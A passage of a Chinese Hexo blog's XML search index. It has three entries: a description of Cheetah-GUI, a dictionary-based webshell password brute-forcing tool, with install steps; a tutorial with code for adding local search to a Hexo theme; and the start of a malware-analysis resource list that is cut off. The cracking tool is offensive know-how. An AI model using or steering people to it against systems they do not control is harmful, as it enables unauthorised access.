<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[Cheetah-GUI]]></title>
      <url>/2018/04/26/Cheetah-GUI/</url>
      <content type="html"><![CDATA[<p><img src="https://github.com/sunnyelf/cheetah/raw/master/images/logo.jpg" alt="cheetah logo"></p><p><a href="https://github.com/sunnyelf/cheetah-gui/blob/master/README.md" target="_blank" rel="external">English description</a> | <a href="https://github.com/sunnyelf/cheetah-gui/blob/master/README_zh.md" target="_blank" rel="external">中文说明</a></p><p><a href="https://opensource.org/licenses/GPL-3.0/" target="_blank" rel="external"><img src="https://badges.frapsoft.com/os/gpl/gpl.png?v=103" alt="GPL Licence"></a><a href="https://travis-ci.org/sunnyelf/cheetah" target="_blank" rel="external"><img src="https://travis-ci.org/sunnyelf/cheetah.svg?branch=master" alt="Build Status"></a><a href="https://codeclimate.com/github/sunnyelf/cheetah" target="_blank" rel="external"><img src="https://codeclimate.com/github/sunnyelf/cheetah/badges/gpa.svg" alt="Code Climate"></a><a href="https://gitter.im/cheetah-community/" target="_blank" rel="external"><img src="https://badges.gitter.im/Join%20Chat.svg" alt="Gitter"></a><a href="https://saythanks.io/to/sunnyelf" target="_blank" rel="external"><img src="https://img.shields.io/badge/Say%20Thanks-!-1EAEDB.svg" alt="Say Thanks!"></a><a href="https://twitter.com/jinglingbiaodi" target="_blank" rel="external"><img src="https://img.shields.io/badge/follow-twitter-blue.svg" alt="Twitter"></a></p><h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h1><p>Cheetah是一款基于字典的webshell密码爆破工具，Cheetah的工作原理是能根据自动探测出的web服务设置相关参数一次性提交大量的探测密码进行爆破，爆破效率是其他普通webshell密码暴力破解工具上千倍。</p><p>此版本是Cheetah的图形用户版本，项目地址：<a href="https://github.com/sunnyelf/cheetah-gui" target="_blank" rel="external">https://github.com/sunnyelf/cheetah-gui</a>。</p><h1 id="0x01-特点"><a href="#0x01-特点" class="headerlink" title="0x01 特点"></a>0x01 特点</h1><ul><li>速度极快</li><li>支持代理</li><li>支持批量爆破</li><li>自动伪造请求</li><li>自动探测web服务设置相关参数</li><li>支持读取和去重超大密码字典文件</li><li>支持python 2.x和3.x</li><li>目前支持php、jsp、asp、aspx webshell</li></ul><h1 id="0x02-下载使用"><a href="#0x02-下载使用" class="headerlink" title="0x02 下载使用"></a>0x02 下载使用</h1><pre><code>git clone https://github.com/sunnyelf/cheetah-gui.git
cd cheetah
python cheetah.py
</code></pre><h1 id="0x03-问题"><a href="#0x03-问题" class="headerlink" title="0x03 问题"></a>0x03 问题</h1><p>如果在使用过程中出现了bug欢迎提交<a href="https://github.com/sunnyelf/cheetah-gui/issues" target="_blank" rel="external">issues</a>，我会及时回复并修复。</p>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> cheetah </tag>
            
            <tag> cheetah-gui </tag>
            
            <tag> webshell-password-cracker </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[给hexo添加本地搜索站内功能]]></title>
      <url>/2017/10/04/%E7%BB%99hexo%E6%B7%BB%E5%8A%A0%E6%9C%AC%E5%9C%B0%E6%90%9C%E7%B4%A2%E7%AB%99%E5%86%85%E5%8A%9F%E8%83%BD/</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前博客用的typecho的deep主题，还是挺喜欢的，只是感觉写文章就是稍微有点麻烦，每次都需要登录网站后台编写或发布，而且很多东西我都喜欢开源，分享知识也是，于是最近就尝试用hexo + github pages，用了这套组合才知道这简直太符合我这种懒癌，博客搭建配置好后，本地编写markdown文章之后直接<code>hexo g</code> 然后<code>hexo d</code> 就发布了，寻找很久的主题，后来看到P牛博客前端用的hexo的<a href="https://github.com/sunnyelf/cactus-dark" target="_blank" rel="external">cactus-dark</a>主题，顿时就喜欢上了，博客配置成功之后又装了一些必要的插件，然后对博客布局和样式代码进行一些修改，由于cactus-dark主题没有搜索功能，于是便尝试给添加搜索功能。</p><h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>至于hexo怎么搭建hexo + github pages博客网上一堆就不讲了，由于搜索功能是调用hexo-generator-search生成xml数据，所以需要安装hexo-generator-search插件：<br></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm install --save hexo-generator-search</div></pre></td></tr></table></figure><p></p><p>然后为hexo博客的配置文件_config.yml添加插件配置（注意：不是主题的配置文件）：<br></p><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="attr">search:</span></div><div class="line"><span class="attr">  path:</span> <span class="string">search.xml</span></div><div class="line"><span class="attr">  field:</span> <span class="string">post</span></div></pre></td></tr></table></figure><p></p><p>添加到search页面的导航：<br></p><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="attr">nav:</span></div><div class="line"><span class="attr">  Home:</span> <span class="string">/</span></div><div class="line"><span class="attr">  About:</span> <span class="string">/about/</span></div><div class="line"><span class="attr">  Link:</span> <span class="string">/link/</span></div><div class="line"><span class="attr">  Archives:</span> <span class="string">/archives/</span></div><div class="line"><span class="attr">  Projects:</span> <span class="attr">https://github.com/sunnyelf</span></div><div class="line"><span class="attr">  Search:</span> <span class="string">/search/</span></div></pre></td></tr></table></figure><p></p><p>然后在<code>themes\cactus-dark\layout</code>文件夹下新建search.ejs文件，编写搜索框模板：<br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">section</span> <span class="attr">id</span>=<span class="string">"search"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"h1"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Search<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">form</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-xs-8 col-md-4"</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"search-input"</span> <span class="attr">id</span>=<span class="string">"search-input"</span> <span class="attr">placeholder</span>=<span class="string">"search..."</span>&gt;</span></div><div class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-xs-4 col-md-2"</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"reset"</span> <span class="attr">class</span>=<span class="string">"reset-button"</span> <span class="attr">onclick</span>=<span class="string">"resetSearch()"</span>&gt;</span>reset<span class="tag">&lt;/<span class="name">button</span>&gt;</span></div><div class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"search-result"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">'no-result'</span>&gt;</span>No results found<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></div></pre></td></tr></table></figure><p></p><p>由于上面用到了flexboxgrid的CSS框架，所以需要在<code>C:\Users\Jing Ling\Documents\blog\themes\cactus-dark\layout\_partial\styles.ejs</code>文件引入：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;% if (page.layout === &apos;search&apos;) &#123; %&gt;</div><div class="line">&lt;link href=&quot;https://cdn.bootcss.com/flexboxgrid/6.3.1/flexboxgrid.min.css&quot; rel=&quot;stylesheet&quot;&gt;</div><div class="line">&lt;% &#125; %&gt;</div></pre></td></tr></table></figure><p></p><p>，之后<code>\themes\cactus-dark\source\css\_partial</code>新建search.styl文件，编写搜索框样式：<br></p><figure class="highlight styl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line">.search-input</div><div class="line">  <span class="attribute">font-size</span>: <span class="number">0.875rem</span></div><div class="line">  <span class="attribute">height</span>: <span class="number">1.75rem</span></div><div class="line">  <span class="attribute">border-width</span>: <span class="number">1px</span></div><div class="line">  <span class="attribute">display</span>: block</div><div class="line">  <span class="attribute">font-family</span>: inherit</div><div class="line">  <span class="attribute">padding</span>: <span class="number">0.5rem</span></div><div class="line">  <span class="attribute">width</span>: <span class="number">100%</span></div><div class="line"></div><div class="line">.reset-button</div><div class="line">  <span class="attribute">height</span>: <span class="number">1.75rem</span></div><div class="line">  <span class="attribute">color</span>: <span class="number">#fff</span></div><div class="line">  <span class="attribute">background-color</span>: <span class="number">#2bbc8a</span>;</div><div class="line">  <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">16px</span></div><div class="line">  font-size:.8em</div><div class="line">  <span class="attribute">border</span>:<span class="number">1px</span> solid <span class="number">#2bbc8a</span>;</div><div class="line">  <span class="attribute">border-radius</span>:<span class="number">2px</span>;</div><div class="line">  <span class="attribute">font-family</span>: inherit</div><div class="line">  <span class="attribute">font-weight</span>: bold</div><div class="line"></div><div class="line"><span class="selector-id">#search-result</span> <span class="selector-tag">ul</span><span class="selector-class">.search-result-list</span> &#123;</div><div class="line">  <span class="attribute">list-style-type</span>:none;</div><div class="line">  <span class="attribute">padding</span>: <span class="number">0px</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-id">#search-result</span> <span class="selector-tag">li</span> &#123;</div><div class="line">  <span class="attribute">margin</span>: <span class="number">2em</span> auto;</div><div class="line">  <span class="attribute">border-bottom</span>: <span class="number">2px</span> solid <span class="number">#2bbc8a</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-id">#search-result</span> <span class="selector-class">.search-result-list</span> <span class="selector-tag">li</span>:hover &#123;</div><div class="line">  <span class="attribute">color</span>:<span class="number">#eee</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-id">#search-result</span> <span class="selector-tag">a</span><span class="selector-class">.search-result-title</span> &#123;</div><div class="line">  <span class="attribute">line-height</span>: <span class="number">1.2</span>;</div><div class="line">  <span class="attribute">font-weight</span>: bold;</div><div class="line">  <span class="attribute">color</span>: <span class="number">#2bb48a</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-id">#search-result</span> <span class="selector-tag">p</span><span class="selector-class">.search-result</span> &#123;</div><div class="line">  <span class="attribute">margin</span>: <span class="number">0.4em</span> auto;</div><div class="line">  <span class="attribute">max-height</span>: <span class="number">13em</span>;</div><div class="line">  <span class="attribute">overflow</span>: hidden;</div><div class="line">  <span class="attribute">font-size</span>: <span class="number">0.8em</span>;</div><div class="line">  <span class="attribute">text-align</span>: justify;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-id">#search-result</span> <span class="selector-tag">em</span><span class="selector-class">.search-keyword</span> &#123;</div><div class="line">  <span class="attribute">color</span>: <span class="number">#f58e90</span>;</div><div class="line">  <span class="attribute">border-bottom</span>: <span class="number">1px</span> dashed <span class="number">#f58e90</span>;</div><div class="line">  <span class="attribute">font-weight</span>: bold;</div><div class="line">  <span class="attribute">font-size</span>: <span class="number">0.85em</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-tag">p</span><span class="selector-class">.no-result</span> &#123;</div><div class="line">  <span class="attribute">display</span>: none;</div><div class="line">  <span class="attribute">padding-bottom</span>: <span class="number">0.5em</span>;</div><div class="line">  <span class="attribute">color</span>: <span class="number">#eee</span>;</div><div class="line">  <span class="attribute">border-bottom</span>: <span class="number">2px</span> solid <span class="number">#2bbc8a</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p></p><p>为了调用编写的样式需要在<code>\themes\cactus-dark\source\css\style.styl</code>样式文件添加<code>@import &quot;_partial/search&quot;</code>引入。<br>之后便是编写search.js处理hexo-generator-search生成索引数据search.xml：<br></p><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// // A local search script with the help of [hexo-generator-search](https://github.com/PaicHyperionDev/hexo-generator-search)</span></div><div class="line"><span class="comment">// MIT License</span></div><div class="line"><span class="comment">// Copyright (C) 2015</span></div><div class="line"><span class="comment">// Joseph Pan &lt;https://github.com/wzpan&gt;</span></div><div class="line"><span class="comment">// Shuhao Mao &lt;https://github.com/maoshuhao&gt;</span></div><div class="line"><span class="comment">// MOxFIVE &lt;https://github.com/MOxFIVE&gt;</span></div><div class="line"><span class="comment">// Jing Ling &lt;https://github.com/sunnyelf&gt;</span></div><div class="line"><span class="keyword">var</span> searchFunc = <span class="function"><span class="keyword">function</span> (<span class="params">path, search_id, content_id</span>) </span>&#123;</div><div class="line"><span class="meta">    'use strict'</span>;</div><div class="line">    $.ajax(&#123;</div><div class="line">        url: path,</div><div class="line">        dataType: <span class="string">"xml"</span>,</div><div class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">xmlResponse</span>) </span>&#123;</div><div class="line">            <span class="comment">// get the contents from search data</span></div><div class="line">            <span class="keyword">var</span> datas = $(<span class="string">"entry"</span>, xmlResponse).map(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">                <span class="keyword">return</span> &#123;</div><div class="line">                    title: $(<span class="string">"title"</span>, <span class="keyword">this</span>).text(),</div><div class="line">                    content: $(<span class="string">"content"</span>, <span class="keyword">this</span>).text(),</div><div class="line">                    url: $(<span class="string">"url"</span>, <span class="keyword">this</span>).text()</div><div class="line">                &#125;;</div><div class="line">            &#125;).get();</div><div class="line">            <span class="keyword">var</span> $input = <span class="built_in">document</span>.getElementById(search_id);</div><div class="line">            <span class="keyword">var</span> $resultContent = <span class="built_in">document</span>.getElementById(content_id);</div><div class="line">            $input.addEventListener(<span class="string">'input'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">                <span class="keyword">var</span> str = <span class="string">'&lt;ul class=\"search-result-list\"&gt;'</span>;</div><div class="line">                <span class="keyword">var</span> keywords = <span class="keyword">this</span>.value.trim().toLowerCase().split(<span class="regexp">/[\s\-]+/</span>);</div><div class="line">                $resultContent.innerHTML = <span class="string">""</span>;</div><div class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.value.trim().length &lt;= <span class="number">0</span>) &#123;</div><div class="line">                    <span class="keyword">return</span>;</div><div class="line">                &#125;</div><div class="line">                <span class="comment">// perform local searching</span></div><div class="line">                datas.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</div><div class="line">                    <span class="keyword">var</span> isMatch = <span class="literal">true</span>;</div><div class="line">                    <span class="keyword">var</span> content_index = [];</div><div class="line">                    <span class="keyword">var</span> data_title = data.title.trim().toLowerCase();</div><div class="line">                    <span class="keyword">var</span> data_content = data.content.trim().replace(<span class="regexp">/&lt;[^&gt;]+&gt;/g</span>, <span class="string">""</span>).toLowerCase();</div><div class="line">                    <span class="keyword">var</span> data_url = data.url;</div><div class="line">                    <span class="keyword">var</span> index_title = <span class="number">-1</span>;</div><div class="line">                    <span class="keyword">var</span> index_content = <span class="number">-1</span>;</div><div class="line">                    <span class="keyword">var</span> first_occur = <span class="number">-1</span>;</div><div class="line">                    <span class="comment">// only match artiles with not empty titles and contents</span></div><div class="line">                    <span class="keyword">if</span> (data_title != <span class="string">''</span> &amp;&amp; data_content != <span class="string">''</span>) &#123;</div><div class="line">                        keywords.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">keyword, i</span>) </span>&#123;</div><div class="line">                            index_title = data_title.indexOf(keyword);</div><div class="line">                            index_content = data_content.indexOf(keyword);</div><div class="line">                            <span class="keyword">if</span> (index_title &lt; <span class="number">0</span> &amp;&amp; index_content &lt; <span class="number">0</span>) &#123;</div><div class="line">                                isMatch = <span class="literal">false</span>;</div><div class="line">                            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                                <span class="keyword">if</span> (index_content &lt; <span class="number">0</span>) &#123;</div><div class="line">                                    index_content = <span class="number">0</span>;</div><div class="line">                                &#125;</div><div class="line">                                <span class="keyword">if</span> (i == <span class="number">0</span>) &#123;</div><div class="line">                                    first_occur = index_content;</div><div class="line">                                &#125;</div><div class="line">                            &#125;</div><div class="line">                        &#125;);</div><div class="line">                    &#125;</div><div class="line">                    <span class="comment">// show search results</span></div><div class="line">                    <span class="keyword">if</span> (isMatch) &#123;</div><div class="line">                        str += <span class="string">"&lt;li&gt;&lt;a href='"</span> + data_url + <span class="string">"' class='search-result-title' target='_blank'&gt;"</span> + <span class="string">"&gt; "</span> + data_title + <span class="string">"&lt;/a&gt;"</span>;</div><div class="line">                        <span class="keyword">var</span> content = data.content.trim().replace(<span class="regexp">/&lt;[^&gt;]+&gt;/g</span>, <span class="string">""</span>);</div><div class="line">                        <span class="keyword">if</span> (first_occur &gt;= <span class="number">0</span>) &#123;</div><div class="line">                            <span class="comment">// cut out characters</span></div><div class="line">                            <span class="keyword">var</span> start = first_occur - <span class="number">6</span>;</div><div class="line">                            <span class="keyword">var</span> end = first_occur + <span class="number">6</span>;</div><div class="line">                            <span class="keyword">if</span> (start &lt; <span class="number">0</span>) &#123;</div><div class="line">                                start = <span class="number">0</span>;</div><div class="line">                            &#125;</div><div class="line">                            <span class="keyword">if</span> (start == <span class="number">0</span>) &#123;</div><div class="line">                                end = <span class="number">10</span>;</div><div class="line">                            &#125;</div><div class="line">                            <span class="keyword">if</span> (end &gt; content.length) &#123;</div><div class="line">                                end = content.length;</div><div class="line">                            &#125;</div><div class="line">                            <span class="keyword">var</span> match_content = content.substr(start, end);</div><div class="line">                            <span class="comment">// highlight all keywords</span></div><div class="line">                            keywords.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">keyword</span>) </span>&#123;</div><div class="line">                                <span class="keyword">var</span> regS = <span class="keyword">new</span> <span class="built_in">RegExp</span>(keyword, <span class="string">"gi"</span>);</div><div class="line">                                match_content = match_content.replace(regS, <span class="string">"&lt;em class=\"search-keyword\"&gt;"</span> + keyword + <span class="string">"&lt;/em&gt;"</span>);</div><div class="line">                            &#125;)</div><div class="line">                            str += <span class="string">"&lt;p class=\"search-result\"&gt;"</span> + match_content + <span class="string">"...&lt;/p&gt;"</span></div><div class="line">                        &#125;</div><div class="line">                    &#125;</div><div class="line">                &#125;)</div><div class="line">                $resultContent.innerHTML = str;</div><div class="line">            &#125;)</div><div class="line">        &#125;</div><div class="line">    &#125;)</div><div class="line">&#125;</div><div class="line"><span class="keyword">var</span> inputArea = <span class="built_in">document</span>.querySelector(<span class="string">"#search-input"</span>);</div><div class="line"><span class="keyword">var</span> $resultArea = $(<span class="string">"#search-result"</span>);</div><div class="line">inputArea.onfocus = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> path = <span class="string">"/search.xml"</span>;</div><div class="line">    searchFunc(path, <span class="string">'search-input'</span>, <span class="string">'search-result'</span>);</div><div class="line">&#125;</div><div class="line">inputArea.onkeydown = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (event.keyCode == <span class="number">13</span>) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">resetSearch = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    $resultArea.html(<span class="string">""</span>);</div><div class="line">    $(<span class="string">".no-result"</span>).hide();</div><div class="line">&#125;</div><div class="line">$resultArea.bind(<span class="string">"DOMNodeRemoved DOMNodeInserted"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (!$(e.target).text()) &#123;</div><div class="line">        $(<span class="string">".no-result"</span>).show(<span class="number">200</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $(<span class="string">".no-result"</span>).hide();</div><div class="line">    &#125;</div><div class="line">&#125;)</div></pre></td></tr></table></figure><p></p><p>将search.js放入到<code>\themes\cactus-dark\source\js</code>文件夹下，为了调用js需要在<code>\themes\cactus-dark\layout\_partial\scripts.ejs</code>添加引入：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;% if (page.layout === &apos;search&apos;) &#123; %&gt;</div><div class="line">    &lt;%- js(&apos;js/search.js&apos;) %&gt;</div><div class="line">&lt;% &#125; %&gt;</div></pre></td></tr></table></figure><p></p><p>使用hexo命令新建search页面，<code>hexo new page search</code>，会生成<code>\source\search\index.md</code>，在index.md添加yaml标记,表示此页面渲染使用search模板：<br></p><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">---</span></div><div class="line"><span class="attr">layout:</span> <span class="string">search</span></div><div class="line"><span class="meta">---</span></div></pre></td></tr></table></figure><p></p><p>最后依此使用<code>hexo generate</code>和<code>hexo server</code>命令，访问<code>http://localhost:4000/search/</code>便可以进行搜索了。</p><h1 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h1><p>如果你不想折腾话，我已将添加了搜索功能pull到了<a href="https://github.com/probberechts/cactus-dark" target="_blank" rel="external">cactus-dark</a>，你可以根据cactus-dark的说明直接开始使用。</p>]]></content>
      
        <categories>
            
            <category> 学习记录 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> hexo </tag>
            
            <tag> search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[超赞的恶意软件分析]]></title>
      <url>/2017/10/03/%E8%B6%85%E8%B5%9E%E7%9A%84%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<p><img src="/2017/10/03/超赞的恶意软件分析/0.png" alt="超赞的恶意软件分析"></p><h1 id="超赞的恶意软件分析"><a href="#超赞的恶意软件分析" class="headerlink" title="超赞的恶意软件分析"></a>超赞的恶意软件分析</h1><p>清单列举了一些超赞的恶意软件分析工具和资源。</p><ul><li><a href="#超赞的恶意软件分析">超赞的恶意软件分析</a><ul><li><a href="#恶意软件集合">恶意软件集合</a><ul><li><a href="#匿名代理">匿名代理</a></li><li><a href="#蜜罐">蜜罐</a></li><li><a href="#恶意软件样本库">恶意软件样本库</a></li></ul></li><li><a href="#开源威胁情报">开源威胁情报</a><ul><li><a href="#工具">工具</a></li><li><a href="#其他资源">其他资源</a></li></ul></li><li><a href="#检测与分类">检测与分类</a></li><li><a href="#在线扫描与沙盒">在线扫描与沙盒</a></li><li><a href="#域名分析">域名分析</a></li><li><a href="#浏览器恶意软件">浏览器恶意软件</a></li><li><a href="#文档和 Shellcode">文档和 Shellcode</a></li><li><a href="#文件提取">文件提取</a></li><li><a href="#去混淆">去混淆</a></li><li><a href="#调试与逆向工程">调试与逆向工程</a></li><li><a href="#网络">网络</a></li><li><a href="#内存取证">内存取证</a></li><li><a href="#Windows 神器">Windows 神器</a></li><li><a href="#存储和工作流">存储和工作流</a></li><li><a href="#杂项">杂项</a></li></ul></li><li><a href="#资源">资源</a><ul><li><a href="#书籍">书籍</a></li><li><a href="#Twitter">Twitter</a></li><li><a href="#其它">其它</a></li></ul></li><li><a href="#相关 Awesome 清单">相关 Awesome 清单</a></li><li><a href="#贡献者">贡献者</a></li><li><a href="#致谢">致谢</a></li></ul><hr><h2 id="恶意软件集合"><a href="#恶意软件集合" class="headerlink" title="恶意软件集合"></a>恶意软件集合</h2><h3 id="匿名代理"><a href="#匿名代理" class="headerlink" title="匿名代理"></a>匿名代理</h3><p><em>对于分析人员的 Web 流量匿名方案</em></p><ul><li><a href="http://anonymouse.org/" target="_blank" rel="external">Anonymouse.org</a> - 一个免费、基于 Web 的匿名代理</li><li><a href="https://openvpn.net/" target="_blank" rel="external">OpenVPN</a> - VPN 软件和托管解决方案</li><li><a href="http://www.privoxy.org/" target="_blank" rel="external">Privoxy</a> - 一个带有隐私保护功能的开源代理服务器</li><li><a href="https://www.torproject.org/" target="_blank" rel="external">Tor</a> - 洋葱路由器，为了在浏览网页时不留下客户端 IP 地址</li></ul><h3 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h3><p><em>捕获和收集你自己的样本</em></p><ul><li><a href="https://github.com/mushorg/conpot" target="_blank" rel="external">Conpot</a> - ICS/SCADA 蜜罐</li><li><a href="https://github.com/micheloosterhof/cowrie" target="_blank" rel="external">Cowrie</a> - 基于 Kippo 的 SSH 蜜罐</li><li><a href="http://dionaea.carnivore.it/" target="_blank" rel="external">Dionaea</a> - 用来捕获恶意软件的蜜罐</li><li><a href="http://glastopf.org/" target="_blank" rel="external">Glastopf</a> - Web 应用蜜罐</li><li><a href="http://honeyd.org/" target="_blank" rel="external">Honeyd</a> - 创建一个虚拟蜜罐</li><li><a href="http://honeydrive.org/" target="_blank" rel="external">HoneyDrive</a> - 蜜罐包的 Linux 发行版</li><li><a href="https://github.com/johnnykv/mnemosyne" target="_blank" rel="external">Mnemosyne</a> - 受 Dinoaea 支持的蜜罐数据标准化</li><li><a href="https://github.com/buffer/thug" target="_blank" rel="external">Thug</a> - 用来调查恶意网站的低交互蜜罐</li></ul><h3 id="恶意软件样本库"><a href="#恶意软件样本库" class="headerlink" 